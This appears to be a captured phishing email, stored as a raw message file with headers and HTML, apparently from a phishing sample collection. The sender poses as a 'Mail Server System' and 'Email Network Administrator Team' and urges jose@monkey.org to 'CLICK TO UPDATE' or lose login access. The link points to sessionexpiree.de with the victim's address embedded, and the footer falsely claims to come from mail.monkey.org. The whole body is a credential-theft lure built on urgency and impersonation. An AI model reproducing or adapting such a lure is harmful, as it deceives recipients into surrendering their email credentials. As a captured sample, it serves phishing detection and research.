@@ -1,0 +1,121 @@
+Return-Path: kit@migenetika.com
+Delivered-To: jose@monkey.org
+X-FDA: 83171049738.15.BCEB229
+Received: from youthful-beaver.45-129-185-34.plesk.page (unknown
+ [45.129.185.34])
+	by imf11.b.hostedemail.com (Postfix) with ESMTP id B17FC80005
+	for <jose@monkey.org>; Sat,  1 Mar 2025 00:10:07 +0000 (UTC)
+Authentication-Results: imf11.b.hostedemail.com;
+	dkim=none;
+	spf=softfail (imf11.b.hostedemail.com: 45.129.185.34 is neither permitted nor
+ denied by domain of kit@migenetika.com) smtp.mailfrom=kit@migenetika.com;
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1740787808;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references; bh=34kJiBpcb8DteVyB0Kcjb/T+BwyOja3zbj2lFGzyhhk=;
+	b=xrSmytISTjAg+gOYp48WJ8v+vEIWrEKJ+seTf0LEje3GCCyUEQzfOugqTR0aLAmHi2odwH
+	W+I3ihvXbXrmV56mCxWKM80rYAFiVb6ND2TFtroBdo7mIfMbH6F0Ns1yQQdUelThDyp0+T
+	UQffKOEJR+3r4DDCmjmIMV4aYDWmGag=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1740787808; a=rsa-sha256;
+	cv=none;
+	b=bdnWni5I6+K0JYPYXESZ9p/RAabZOf2zWbfwBP9Gp53fuS6MrWLaNtwyJR7MMKOy+piRQV
+	9rcWhSD0H03xZ6P8eMhsbRN0xI1L3syTLBGOQGEHrf/iRAEn9KXsQiEUXkzsVLnxMS/QbO
+	oNYP+oT/ch00XTvnD4h3wLi2qwlmg0k=
+ARC-Authentication-Results: i=1;
+	imf11.b.hostedemail.com;
+	dkim=none;
+	spf=softfail (imf11.b.hostedemail.com: 45.129.185.34 is neither permitted nor
+ denied by domain of kit@migenetika.com) smtp.mailfrom=kit@migenetika.com;
+	dmarc=none
+Received: from migenetika.com (unknown [74.234.24.187])
+	by youthful-beaver.45-129-185-34.plesk.page (Postfix) with ESMTPSA id
+ 8DB6E1AE5A4
+	for <jose@monkey.org>; Sun, 23 Feb 2025 02:19:32 +0400 (+04)
+Received-SPF: pass (youthful-beaver.45-129-185-34.plesk.page: connection is
+ authenticated)
+From: Mail Server System<kit@migenetika.com>
+To: jose@monkey.org
+Subject: Notification on  jose-AUTORQ-2025 - UPDATE REQUIRED URGENT
+Date: 22 Feb 2025 22:19:32 +0000
+Message-ID: <20250222221931.4189E4DDCE5A5E7F@migenetika.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Spam-Status: Yes, score=15.88
+X-Stat-Signature: 4or6uhydnupsankd41ez13yrh4cwyxty
+X-Rspamd-Server: rspam03
+X-Rspamd-Queue-Id: B17FC80005
+X-Rspam-User: 
+X-HE-Tag: 1740787807-138723
+X-HE-Meta: 
+ U2FsdGVkX186CTcFDH4VaujM+nbQOqKog5PB7rqp3NbNjqmSDbzhi3r5aUtChoG8fA4PUGk8lvzKd77w6Kf6BTF42MCxx/nTEwkSSS4qP8LuP7n6QoBeszlF03QMb72FKAdEiHRiF8MO0ZSsjqiPcUflt0yu+UlUpvibMjQUjZCjLAGk4RnwOEWngnWnOoweiVAFcghzhy/J8XD1syxEKZB1BjfpChFyvMbrJsZc+0884ktR6NIZBh6iLPtTYOzs1y9ReBGh6ENwBXdf38cTIAIdluGOal/3QPH3S8tf463J8pv41+TrvHIuxlFaX27z0vfZtAXxK9tzdDHrPDeCqzY+gw1e7i4Agb42y3NDi9tYRW81PmLHkpi90LdxD7773gvQ+UJbBSr0qyKJVm2JR3OtqtnHQBjucjjajBgT9OPlA+zV/jZb56DOTqqhzPYNdG8M3Snhz5tpT+yi0Z8MnaylzDqs3dOjJ2vW1zZK1pcPM7fVKJJPWtd/kxbGawNHJVK0u0oOv/F8oMtqV30XIILDuGgoCCb3el7GdN1R2/JbLIi8oGjYM1EjV0g4m/lglA1QhA8pZI2LGNsFLUoiu29NTnnSMF6kZMRYjOKXJlWLLdlzzFnFiOKoqKrRomLYGAr97WqrmnSYzqRk+0behaVM8Lwb3h3Sn543gFmIr79yTeGDy3SOj6EXn/wK4euoWIqJlCTymtaQC24XM4hX47dn6vw8czMm00476y+F7n8VJNP3MWO6Vgk7TDcr6j9LvehSoYEV1QMMyLnmDTW8dkpOIpSd0SlLLX9xOxs0uApkv+1Cc6vYNR0UwTtnq+MqDUoLfsYfvfejCy3xnpwky+jxxKLw5dUazD1ZIQ4K47jExWWqapV4QVXkngj7v5DqbLriraZpsiwvUk+CeVDElxuI9jzW3NFd4hCKwzUcDNNZHV4aBb3g+QAIB/koExK1AG9QwTxaGTOubae9HPzUFi/cvry
+ ECzo2m80hNoCyw3leaKVfM2cKv0UHGdRZhxpASNyOA79YA3sTIFfC0bjnqJlY5CcBXmg9Y2D3cCwEyDQzXt1HeDBJNpJPIIjldP2t92MuBpYiRT9yuMlAPLauQPPtPyVyx5is43d+n24fSfW/O9Vy/o14F1yOhNDFd7CybKrn8r9z/swu70VX3XfH8pEelAdcVNxMMkTomCJHsBKGToNUFigfaj+Tic1hN19x/n8WoX+IvyIVH55KuIRIhOHiwP526zxmCfoTsMc248/RZQyOG/B8USHMraAHmrlzBsEJe3zOAaF0PoEEefiXAA==
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 70
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<body>
+<DIV id=3Deditbody1>
+<DIV style=3D"MARGIN: 0.4em">
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 16px; FONT-FAMILY: Calibri=
+ , sans-serif , serif , EmojiFont; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN:=
+ baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 20px; PADDING-TOP: 20p=
+x; PADDING-LEFT: 20px; MARGIN: 0px; PADDING-RIGHT: 20px; BORDER-TOP-WIDTH: =
+0px; font-stretch: inherit">
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-FAMILY: inherit; BORDER-RIGHT-WI=
+DTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTO=
+M: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0p=
+x; BORDER-TOP-WIDTH: 0px; font-stretch: inherit">
+<P><SPAN><FONT size=3D5>jose@monkey.org,</FONT><BR><BR>2/22/2025 10:19:31 p=
+=2Em.<BR><BR>Complete update on&nbsp;your account now, you are required to =
+complete the new network service update and avoid loosing <BR>login access =
+to your email.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<BR>&nbsp;&nbsp=
+;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;<BR>&nbsp;&nbsp; <A href=3D"https://sessionexpi=
+ree.de/cpa/iuo.html#jose@monkey.org" rel=3D"noopener noreferrer" target=3D_=
+blank>
+<STRONG>CLICK TO UPDATE</STRONG></A><BR><BR><SPAN style=3D"FONT-SIZE: 12px;=
+ FONT-FAMILY: Roboto , Arial; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-=
+TRANSFORM: none; FLOAT: none; COLOR: #333333; FONT-STYLE: normal; ORPHANS: =
+2; WIDOWS: 2; DISPLAY: inline; LETTER-SPACING: normal; BACKGROUND-COLOR: #f=
+fffff; TEXT-INDENT: 0px"></SPAN></SPAN></P></DIV>
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALI=
+GN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0=
+px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0=
+px; font-stretch: inherit">
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 15px; FONT-FAMILY: Arial ,=
+ Helvetica , sans-serif , serif , EmojiFont; BORDER-RIGHT-WIDTH: 0px; VERTI=
+CAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: #201f1e; PADDING-BOTT=
+OM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0=
+px; BORDER-TOP-WIDTH: 0px; font-stretch: inherit">
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-FAMILY: inherit; BORDER-RIGHT-WI=
+DTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTO=
+M: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0p=
+x; BORDER-TOP-WIDTH: 0px">
+<SPAN style=3D"FONT-SIZE: 12px; FONT-FAMILY: Roboto , Arial; WHITE-SPACE: n=
+ormal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 6=
+00; COLOR: #333333; FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; DISPLAY: inl=
+ine; LETTER-SPACING: normal; BACKGROUND-COLOR: #ffffff; TEXT-INDENT: 0px">E=
+mail Network Administrator Team</SPAN></DIV>
+<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-FAMILY: inherit; BORDER-RIGHT-WI=
+DTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTO=
+M: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0p=
+x; BORDER-TOP-WIDTH: 0px">
+<SPAN style=3D"FONT-SIZE: 12px; FONT-FAMILY: Roboto , Arial; WHITE-SPACE: n=
+ormal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 6=
+00; COLOR: #333333; FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; DISPLAY: inl=
+ine; LETTER-SPACING: normal; BACKGROUND-COLOR: #ffffff; TEXT-INDENT: 0px">&=
+copy;2025 <A href=3D"https://sessionexpiree.de/cpa/iuo.html#jose@monkey.org=
+" rel=3D"noopener noreferrer" target=3D_blank>mail.</A>monkey.org&nbsp;&nbs=
+p;All Rights Reserved</SPAN></DIV></DIV></DIV></DIV></DIV>
+</DIV></BODY></HTML>
+
